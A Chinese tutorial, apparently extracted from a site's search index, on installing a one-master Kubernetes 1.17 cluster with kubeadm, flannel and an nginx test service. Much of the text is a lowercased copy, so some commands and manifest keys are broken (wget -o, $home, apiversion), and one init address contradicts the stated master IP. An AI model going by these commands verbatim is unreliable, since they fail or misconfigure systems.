\n451\n452\n453\n454\n455\n456\n457\n458\n459\n460\n461\n462\n463\n464\n465\n466\n467\n468\n469\n470\n471\n472\n473\n474\n475\n476\n477\n478\n479\n480\n481\n482\n483\n484\n485\n486\n487\n488\n489\n490\n491\n492\n493\n494\n495\n496\n497\n498\n499\n500\n501\n502\n503\n504\n505\n506\n507\n508\n509\n510\n511\n512\n513\n514\n515\n516\n517\n518\n519\n520\n521\n522\n523\n524\n525\n526\n527\n528\n529\n530\n531\n532\n533\n534\n535\n536\n537\n538\n539\n540\n541\n542\n543\n544\n545\n546\n547\n548\n549\n550\n551\n552\n553\n554\n555\n556\n557\n558\n559\n560\n561\n562\n563\n564\n565\n566\n567\n568\n569\n570\n571\n572\n573\n574\n575\n576\n577\n578\n579\n580\n581\n582\n583\n584\n585\n586\n587\n588\n589\n590\n591\n592\n593\n594\n595\n596\n597\n598\n599\n600\n601\n602\n603\n604\n\n\n执行以下命令\n\nkubectl apply -f kube-flannel.yml \n\n\n1\n\n\n查看节点状态，只要从 NotReady 到 Ready 就算成功\n\n\n# 服务部署\n\n部署一个 nginx 程序，测试下集群是否在正常工作，直接在 master 操作\n\n# 部署nginx\nkubectl create deployment nginx --image=nginx:1.14-alpine\n# 暴露端口\nkubectl expose deployment nginx --port=80 --type=NodePort\n\n# 查看服务状态\n[root@localhost package]# kubectl get pods,svc\nNAME                         READY   STATUS    RESTARTS   AGE\npod/nginx-6867cdf567-2l7tr   1/1     Running   0          50s\n\nNAME                 TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE\nservice/kubernetes   ClusterIP   10.96.0.1        <none>        443/TCP        71m\nservice/nginx        NodePort    10.101.119.180   <none>        80:31543/TCP   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n31543 这个端口就是外部端口，可以通过节点名称 + 端口号直接访问测试',normalizedContent:'# 1 前置知识点\n\nkubernetes 集群大体上分为两类：一主多从 和 多主多从。\n\n * 一主多从：一台 mater 节点和多台 node 节点，搭建简单，但是由单机故障风险，适合用于测试环境\n * 多主多从：多台 master 节点和多台 node 节点，搭建麻烦，安全性高，适用于生产环境。\n\n\n\n\n# 1.2 安装方式\n\nkubernetes 多有多种部署方式，目前主流的方式由 kubeadm、minikube、二进制包\n\n * minikube：一个用于快速搭建单节点 kubernetes 的工具\n * kubeadm：一个用快速搭建 kubernetes 集群的工具\n * 二进制包：从官网下载每个组件的二进制包，以此去安装，此方式对于理解 kubernetes 组件更加有效\n\n> 新手推荐 kubeadm\n\n\n# 1.3 kubeadm 部署方式介绍\n\nkubeadm 是官方社区推出的一个用于快速部署 kubernetes 集群的工具，这个工具能通过两条指令完成一个 kubernetes 集群的部署：\n\n * 创建一个 master 节点 kubeadm init\n * 将 node 节点加入到当前集群中 $ kubeadm join <master 节点的 ip 和端口>\n\n> kubeadm 安装集群要求 centos7.5 及以上\n\n\n# 1.4 安装要求\n\n在开始之前，部署 kubernetes 集群机器需要满足以下几个条件：\n\n * 一台或多台机器，操作系统 centos7.x-86_x64\n * 硬件配置：2gb 或更多 ram，2 个 cpu 或更多 cpu，硬盘 30gb 或更多\n * 集群中所有机器之间网络互通\n * 可以访问外网，需要拉取镜像\n * 禁止 swap 分区\n\n\n# 1.5 最终目标\n\n * 在所有节点上安装 docker 和 kubeadm\n * 部署 kubernetes master\n * 部署容器网络插件\n * 部署 kubernetes node，将节点加入 kubernetes 集群中\n * 部署 dashboard web 页面，可视化查看 kubernetes 资源\n\n\n# 2 安装部署\n\n\n\n角色       hostname   ip               组件\nmaster   node101    192.168.81.101   docker，kubectl，kubeadm，kubelet\nnode1    node102    192.168.81.102   docker，kubectl，kubeadm，kubelet\nnode2    node103    192.168.81.103   docker，kubectl，kubeadm，kubelet\n\n> 以下没有特定说明在 master 还是 node 上操作，默认全部节点需要操作。\n\n\n# 2.1 hostname 及解析\n\n不管搭建设什么集群，切记设置好 hostname，比较方便。两个步骤完成设置：\n\n 1. 临时设置。hostname 节点名称\n 2. vim /etc/hostname\n\n设置完成后要添加解析 hostname 主机名的 ip 映射，vim /etc/hosts 直接修改\n\n192.168.81.101  node101\n192.168.81.102  node102\n192.168.81.103  node103  \n\n\n1\n2\n3\n\n\nhostname node101\n\nvim /etc/hostname\nnode101\n\n\n1\n2\n3\n4\n\n\n\n# 2.2 时间同步\n\nkubernetes 要求据群众的节点时间必须精确一致，这里直接使用 chronyd 服务从网络同步时间。企业中建议配置内部的时间同步服务器。\n\n# 启动chronyd服务\nsystemctl start chronyd\n# 设置chronyd服务开机自启动\nsystemctl enable chronyd\n# chronyd 服务启动稍等几秒钟，就可以使用data命令验证时间了\ndate\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.3 禁用 iptables 和 firewalld 服务\n\nkubernetes 和 docker 在运行中会产生大量的 iptables 规则，为了不让系统规则跟他们混淆，直接关闭系统的规则，生产系统建议开启，需要开放哪些端口或者 ip，手动配置。\n\n# 关闭 firewalld 服务\nsystemctl stop firewalld\nsystemctl disable firewalld\n# 关闭iptanles服务\nsystemctl stop iptables\nsystemctl disable iptables\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.4 禁用 selinux\n\nselinux 是 linux 系统下的一个安全服务，如果不关闭它，在安装集群中可能会被限制\n\n# 临时关闭\nsetenforce 0\n# 永久禁用\nvim /etc/selinux/config\nselinux=disabled\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.5 禁 swap 用分区\n\nswap 分区指的是虚拟内存分区，它的作用是在物理内存使用完之后，将磁盘空间虚拟成内存来使用，启用 swap 设备会对系统的性能产生非常负面的影响，因此 kubernetes 要求每个节点都要禁用 swap 设备，但是如果因为某些原因确实不能关闭 swap 分区，就需要在集群安装的过程中通过明确的参数进行配置说明。\n\n# 临时关闭\nswapoff -a\n\n# 永久关闭，编辑分区配置文件 /etc/fstab，注释掉 wap 分区一行\n#/dev/mapper/centos-swap swap                    swap    defaults        0 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.6 修改 linxu 的内核参数\n\n# 修改linux的内核参数，添加网桥过滤和地址转发功能\n# 编辑 /etc/sysctl.d/k8s.conf 文件，添加如下配置：\nnet.bridge.bridge-nf-call-iptables=1\nnet.bridge.bridge-nf-call-ip6tables=1\nnet.ipv4.ip_forward=1\nnet.ipv4.tcp_tw_recycle=0\nvm.swappiness=0\nvm.overcommit_memory=1\nvm.panic_on_oom=0\nfs.inotify.max_user_watches=89100\nfs.file-max=52706963\nfs.nr_open=52706963\nnet.ipv6.conf.all.disable_ipv6=1\nnet.netfilter.nf_conntrack_max=2310720\n\n# 加载网桥过滤模块\nmodprobe br_netfilter\nmodprobe ip_conntrack\n# 配置完成后重新加载配置文件\nsysctl -p /etc/sysctl.d/k8s.conf\n# 查看网桥过滤模块是否添加成功\nlsmod | grep br_netfilter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.7 配置 ipvs\n\n在 kubernetes 中 service 有两种代理模型，一种是基于 iptables 的，一种是基于 ipvs 的，两者比较的话，ipvs 的性能明显更要高一些，但是如果要使用它，需要手动载入 ipvs 模块\n\n# 安装 ipset 和 ipvsadm \nyum install ipset ipvsadm -y\n\n# 添加需要加载得模块写入脚本文件\ncat <<eof > /etc/sysconfig/modules/ipvs.modules\n#!/bin/bash\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack_ipv4\nmodprobe -- br_netfilter\neof\n\n# 为脚本文件添加执行权限\nchmod +x /etc/sysconfig/modules/ipvs.modules\n\n# 执行脚本文件\n/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n# 查看对应得模块是否加载成功\nlsmod | grep -e ip_vs -e nf_conntrack_ipv4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.8 docker 安装\n\n# 之前安装过docker 卸载\nyum remove docker-*\n\n# 更换镜像地址\nwget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -o /etc/yum.repos.d/docker-ce.repo\n\n# 检查支持版本\nyum list docker-ce --showduplicates | sort -r\n\n# 安装\nyum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7\n\n# 添加一个配置文件，docker在默认情况下使用的cgroup driver为cgroupfs，而kubernetes推荐使用systemd来代替cgroupfs\ncat > /etc/docker/daemon.json <<eof\n{\n  "registry-mirrors": ["https://bk6kzfqm.mirror.aliyuncs.com"],\n  "data-root": "/data/docker",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "log-driver": "json-file",\n  "log-opts": {\n    "max-size": "100m"\n  },\n  "storage-driver": "overlay2",\n  "storage-opts": [\n    "overlay2.override_kernel_check=true"\n  ]\n}\neof\n\n# 启动docker\nsystemctl restart docker\nsystemctl enable docker\n\n#检查版本\ndocker version\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 2.9 安装 kubernetes 组件\n\n由于 kubernetes 的镜像源在国外，速度比较慢，这里切换成国内的镜像源\n\n# 添加配置文件\nvim /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n安装 kubeadm、kubelet 和 kubectl\n\nyum install --setopt=obsoletes=0 kubeadm-1.17.4-0 kubelet-1.17.4-0 kubectl-1.17.4-0\n\n\n1\n\n\n设置 kubelet 开机自启动\n\nsystemctl enable kubelet\n\n\n1\n\n\n\n# 2.10 集群初始化\n\n# 准备镜像\n\nkubeadm config images list\n\nimages=(\n    kube-apiserver:v1.17.4\n    kube-controller-manager:v1.17.4\n    kube-scheduler:v1.17.4\n    kube-proxy:v1.17.4\n    pause:3.1\n    etcd:3.4.3-0\n    coredns:1.6.5\n)\n\n\nfor imagename in ${images[@]} ;do\n    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename\n    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename k8s.gcr.io/$imagename\n    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename\ndone\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 初始化\n\n在 master 点操作如下\n\nkubeadm init \\\n  --kubernetes-version=v1.17.4 \\\n  --pod-network-cidr=10.244.0.0/16 \\\n  --service-cidr=10.96.0.0/12  \\\n  --apiserver-advertise-address=10.240.30.113\n\n\n1\n2\n3\n4\n5\n\n * kubernetes-version 为版本\n * pod-network-cidr 指定 pod 网络\n * service-cidr 指定 service 网络\n * apiserver-advertise-address 指定 master 的 ip 地址\n * image-repository registry.aliyuncs.com/google_containers 指定镜像源为阿里，前面已经拉取过镜像了，所以不需要在拉\n\n# 安装过程中报错如果报错，查看日志\njournalctl -xfeu kubelet\n\n# 重置 kubeadm 的信息\nkubeadm reset\n\n\n1\n2\n3\n4\n5\n\n\n在 master 点创建必要的文件，是 kubectl 以后要执行的配置文件\n\n  mkdir -p $home/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $home/.kube/config\n  sudo chown $(id -u):$(id -g) $home/.kube/config\n\n\n1\n2\n3\n\n\n其他子节点执行，安装成功后会有信息告诉你\n\nkubeadm join 192.168.81.101:6443 --token d5ejth.9s60snjt5xlh9lnt \\\n    --discovery-token-ca-cert-hash sha256:04aab4993001f66f607e959b120294eddcc8579a5ea7d7364f48d84caecc90c9\n\n\n1\n2\n\n\n查看所有节点\n\nkubectl get nodes\n\n\n1\n\n\n\n# 2.11 安装网络插件\n\nkubernetes 支持多种网络插件，比如 flannel、calico、canal 等等，任选一种使用即可，本次选择 flannel\n\n# master 操作\n\n创建文件，复制执内容到文件中\n\ncat <<eof > kube-flannel.yml\n---\napiversion: policy/v1beta1\nkind: podsecuritypolicy\nmetadata:\n  name: psp.flannel.unprivileged\n  annotations:\n    seccomp.security.alpha.kubernetes.io/allowedprofilenames: docker/default\n    seccomp.security.alpha.kubernetes.io/defaultprofilename: docker/default\n    apparmor.security.beta.kubernetes.io/allowedprofilenames: runtime/default\n    apparmor.security.beta.kubernetes.io/defaultprofilename: runtime/default\nspec:\n  privileged: false\n  volumes:\n    - configmap\n    - secret\n    - emptydir\n    - hostpath\n  allowedhostpaths:\n    - pathprefix: "/etc/cni/net.d"\n    - pathprefix: "/etc/kube-flannel"\n    - pathprefix: "/run/flannel"\n  readonlyrootfilesystem: false\n  # users and groups\n  runasuser:\n    rule: runasany\n  supplementalgroups:\n    rule: runasany\n  fsgroup:\n    rule: runasany\n  # privilege escalation\n  allowprivilegeescalation: false\n  defaultallowprivilegeescalation: false\n  # capabilities\n  allowedcapabilities: [\'net_admin\']\n  defaultaddcapabilities: []\n  requireddropcapabilities: []\n  # host namespaces\n  hostpid: false\n  hostipc: false\n  hostnetwork: true\n  hostports:\n  - min: 0\n    max: 65535\n  # selinux\n  selinux:\n    # selinux is unused in caasp\n    rule: \'runasany\'\n---\nkind: clusterrole\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nrules:\n  - apigroups: [\'extensions\']\n    resources: [\'podsecuritypolicies\']\n    verbs: [\'use\']\n    resourcenames: [\'psp.flannel.unprivileged\']\n  - apigroups:\n      - ""\n    resources:\n      - pods\n    verbs:\n      - get\n  - apigroups:\n      - ""\n    resources:\n      - nodes\n    verbs:\n      - list\n      - watch\n  - apigroups:\n      - ""\n    resources:\n      - nodes/status\n    verbs:\n      - patch\n---\nkind: clusterrolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nroleref:\n  apigroup: rbac.authorization.k8s.io\n  kind: clusterrole\n  name: flannel\nsubjects:\n- kind: serviceaccount\n  name: flannel\n  namespace: kube-system\n---\napiversion: v1\nkind: serviceaccount\nmetadata:\n  name: flannel\n  namespace: kube-system\n---\nkind: configmap\napiversion: v1\nmetadata:\n  name: kube-flannel-cfg\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\ndata:\n  cni-conf.json: |\n    {\n      "name": "cbr0",\n      "cniversion": "0.3.1",\n      "plugins": [\n        {\n          "type": "flannel",\n          "delegate": {\n            "hairpinmode": true,\n            "isdefaultgateway": true\n          }\n        },\n        {\n          "type": "portmap",\n          "capabilities": {\n            "portmappings": true\n          }\n        }\n      ]\n    }\n  net-conf.json: |\n    {\n      "network": "10.244.0.0/16",\n      "backend": {\n        "type": "vxlan"\n      }\n    }\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - amd64\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n            add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-arm64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - arm64\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-arm\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - arm\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-ppc64le\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - ppc64le\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-s390x\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - s390x\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\neof\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n372\n373\n374\n375\n376\n377\n378\n379\n380\n381\n382\n383\n384\n385\n386\n387\n388\n389\n390\n391\n392\n393\n394\n395\n396\n397\n398\n399\n400\n401\n402\n403\n404\n405\n406\n407\n408\n409\n410\n411\n412\n413\n414\n415\n416\n417\n418\n419\n420\n421\n422\n423\n424\n425\n426\n427\n428\n429\n430\n431\n432\n433\n434\n435\n436\n437\n438\n439\n440\n441\n442\n443\n444\n445\n446\n447\n448\n449\n450\n451\n452\n453\n454\n455\n456\n457\n458\n459\n460\n461\n462\n463\n464\n465\n466\n467\n468\n469\n470\n471\n472\n473\n474\n475\n476\n477\n478\n479\n480\n481\n482\n483\n484\n485\n486\n487\n488\n489\n490\n491\n492\n493\n494\n495\n496\n497\n498\n499\n500\n501\n502\n503\n504\n505\n506\n507\n508\n509\n510\n511\n512\n513\n514\n515\n516\n517\n518\n519\n520\n521\n522\n523\n524\n525\n526\n527\n528\n529\n530\n531\n532\n533\n534\n535\n536\n537\n538\n539\n540\n541\n542\n543\n544\n545\n546\n547\n548\n549\n550\n551\n552\n553\n554\n555\n556\n557\n558\n559\n560\n561\n562\n563\n564\n565\n566\n567\n568\n569\n570\n571\n572\n573\n574\n575\n576\n577\n578\n579\n580\n581\n582\n583\n584\n585\n586\n587\n588\n589\n590\n591\n592\n593\n594\n595\n596\n597\n598\n599\n600\n601\n602\n603\n604\n\n\n执行以下命令\n\nkubectl apply -f kube-flannel.yml \n\n\n1\n\n\n查看节点状态，只要从 notready 到 ready 就算成功\n\n\n# 服务部署\n\n部署一个 nginx 程序，测试下集群是否在正常工作，直接在 master 操作\n\n# 部署nginx\nkubectl create deployment nginx --image=nginx:1.14-alpine\n# 暴露端口\nkubectl expose deployment nginx --port=80 --type=nodeport\n\n# 查看服务状态\n[root@localhost package]# kubectl get pods,svc\nname                         ready   status    restarts   age\npod/nginx-6867cdf567-2l7tr   1/1     running   0          50s\n\nname                 type        cluster-ip       external-ip   port(s)        age\nservice/kubernetes   clusterip   10.96.0.1        <none>        443/tcp        71m\nservice/nginx        nodeport    10.101.119.180   <none>        80:31543/tcp   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n31543 这个端口就是外部端口，可以通过节点名称 + 端口号直接访问测试',charsets:{cjk:!0}},{title:"kubernetes(三) 资源管理",frontmatter:{title:"kubernetes(三) 资源管理",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/602",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/602.kubernetes(%E4%B8%89)%20%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86.html",relativePath:"01.运维/60.Kubernetes/602.kubernetes(三) 